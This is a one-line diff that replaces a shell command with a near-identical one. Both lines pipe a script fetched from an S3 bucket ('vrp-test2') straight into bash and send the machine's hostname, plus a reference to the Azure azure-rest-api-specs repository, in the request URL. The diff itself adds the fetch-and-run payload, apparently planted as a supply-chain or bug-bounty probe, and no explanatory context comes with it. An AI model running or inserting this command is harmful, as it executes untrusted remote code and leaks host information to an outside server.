@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Azure/azure-rest-api-specs.git\&folder=datacontainer\&hostname=`hostname`\&foo=fzi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Azure/azure-rest-api-specs.git\&folder=datacontainer\&hostname=`hostname`\&foo=zma
